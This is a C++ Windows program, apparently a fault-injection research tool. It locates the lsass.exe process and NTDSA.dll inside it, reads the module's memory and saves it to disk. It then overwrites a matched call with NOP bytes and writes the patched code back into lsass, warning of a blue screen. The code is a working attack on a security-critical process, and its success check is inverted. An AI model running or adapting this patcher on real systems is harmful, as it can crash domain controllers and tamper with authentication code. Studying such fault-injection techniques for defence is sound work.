// FaultInjection.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "Operators.h"

#include <windows.h>
#include <psapi.h>

#include <string>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <io.h>
#include <tchar.h>

bool find_pattern(const byte pattern[], size_t size_of_pattern, byte *buf, size_t size_of_buf, int start, int *offset);

using namespace std;

int _tmain(int argc, _TCHAR* argv[]) {

	// Declarations
	int pid = 0;
	__int64* start_addr;
	DWORD size_of_ntdsa;
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
	HMODULE hmods[1024];
	unsigned int i;

	// Get All pids
	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)){
		cout << "Failed to get all PIDs: " << GetLastError() << endl;
		return -1;
	}

	// Find pid for lsass.exe
	cProcesses = cbNeeded / sizeof(DWORD);
	for (i = 0; i < cProcesses; i++) {
		if (aProcesses[i] != 0) {
			HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);
			if (hProc != NULL) {
				HMODULE hMod;
				DWORD cbNeededMod;
				if (EnumProcessModules(hProc, &hMod, sizeof(hMod), &cbNeededMod)) {
					GetModuleBaseName(hProc, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
				}

				if (wstring(szProcessName).find(L"lsass.exe") != string::npos) {
					pid = aProcesses[i];
				}
				CloseHandle(hProc);
			}
		}
	}

	cout << "lsass pid: " << pid << endl;

	HANDLE h_lsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!h_lsass) {
		cout << "Failed to open process (are you root?): " << GetLastError() << endl;
		return -1;
	}

	// Get Process Image File Name
	char filename[MAX_PATH];
	if (GetProcessImageFileName(h_lsass, (LPTSTR)&filename, MAX_PATH) == 0) {
		cout << "Failed to get image file name: " << GetLastError() << endl;
		CloseHandle(h_lsass);
		return -1;
	}

	// Enumerate modules within process
	if (EnumProcessModules(h_lsass, hmods, sizeof(hmods), &cbNeeded)) {
		for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
			TCHAR szModName[MAX_PATH];
			if (GetModuleFileNameEx(h_lsass, hmods[i], szModName, sizeof(szModName) / sizeof(TCHAR))) {
				if (wstring(szModName).find(L"NTDSA.dll") != string::npos) {
					_tprintf(TEXT("%s\n"), szModName);
					MODULEINFO lModInfo = { 0 };
					if (GetModuleInformation(h_lsass, hmods[i], &lModInfo, sizeof(lModInfo))){
						cout << "\t Base Addr: " << lModInfo.lpBaseOfDll << endl;
						cout << "\t Entry Point: " << lModInfo.EntryPoint << endl;
						cout << "\t Size of image: " << lModInfo.SizeOfImage << endl;

						start_addr = (__int64*)lModInfo.lpBaseOfDll;
						size_of_ntdsa = lModInfo.SizeOfImage;
					}
					else {
						cout << "Failed to Print enumerated list of modules: " << GetLastError() << endl;
					}
				}
			} else {
				cout << "Failed to Print enumerated list of modules: " << GetLastError() << endl;
			}
		}
	}
	else {
		cout << "Failed to enum the modules: " << GetLastError() << endl;
	}

	// Ready to continue?
	string cont = "";
	cout << "Continue? [Y|n]: ";
	getline(cin, cont);
	if (cont.find("n") != string::npos || cont.find("N") != string::npos) {
		CloseHandle(h_lsass);
		return 0;
	}

	byte *buf = (byte *)malloc(size_of_ntdsa);
	if (!buf) {
		cout << "Failed to allocate space for memory contents: " << GetLastError() << endl;
		CloseHandle(h_lsass);
		return -1;
	}

	SIZE_T num_bytes_read = 0;
	int count = 0;

	if (ReadProcessMemory(h_lsass, start_addr, buf, size_of_ntdsa, &num_bytes_read) != 0) {
		cout << "Read success. Got " << num_bytes_read << " bytes: " << endl;
	} else {
		int error_code = GetLastError();
		if (error_code == 299) {
			cout << "Partial read. Got " << num_bytes_read << " bytes: " << endl;
		} else  {
			cout << "Failed to read memory: " << GetLastError() << endl;
			CloseHandle(h_lsass);
			free(buf);
			return -1;
		}
	}

	// Write DLL to disk for static ref
	if (num_bytes_read > 0) {
		FILE *fp;
		fopen_s(&fp, "C:\\ntdsa_new.dll", "w");
		SIZE_T bytes_written = 0;
		while (bytes_written < num_bytes_read) {
			bytes_written += fwrite(buf, 1, num_bytes_read, fp);
		}
		fclose(fp);
		cout << "Wrote " << bytes_written << " bytes." << endl;
	}


	int offset_of_function = 0;
	if (find_pattern(start_pattern_3, sizeof(start_pattern_3), buf, size_of_ntdsa, 0, &offset_of_function)) {
		int offset_of_exit = 0;
		if (find_pattern(end_pattern_3, sizeof(end_pattern_3), buf, size_of_ntdsa, offset_of_function, &offset_of_exit)){
			int size_of_function = offset_of_exit - offset_of_function;
			int call_offset = 0;
			if (find_pattern(call_addr, sizeof(call_addr), buf, size_of_ntdsa, offset_of_function, &call_offset)) {
				byte nop_array[] = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
				memcpy(buf + call_offset, nop_array, sizeof(nop_array));

				SIZE_T mem_bytes_written = 0;
				if (WriteProcessMemory(h_lsass, start_addr, buf, size_of_ntdsa, &mem_bytes_written) != 0)
					cout << "Failed to write to memory: " << GetLastError() << endl;
				else
					cout << "Wrote " << mem_bytes_written << " bytes... prepare for blue screen." << endl;
			}
		}
	}

	CloseHandle(h_lsass);
	free(buf);

	return 0;
}

// Search 'buf' for 'pattern' at 'start'.  If found, sets 'offset', and returns true.
bool find_pattern(const byte pattern[], size_t size_of_pattern, byte *buf, size_t size_of_buf, int start, int *offset) {

	for (unsigned int i = start; i < size_of_buf; i++) {
		if (buf[i] == pattern[0]) {
			for (int j = 1; j < size_of_pattern; j++) {
				if (buf[i + j] != pattern[j])
					break;
				if (j < size_of_pattern - 1)
					continue;

				*offset = i;
				return true;
			}
		}
	}
	return false;
}
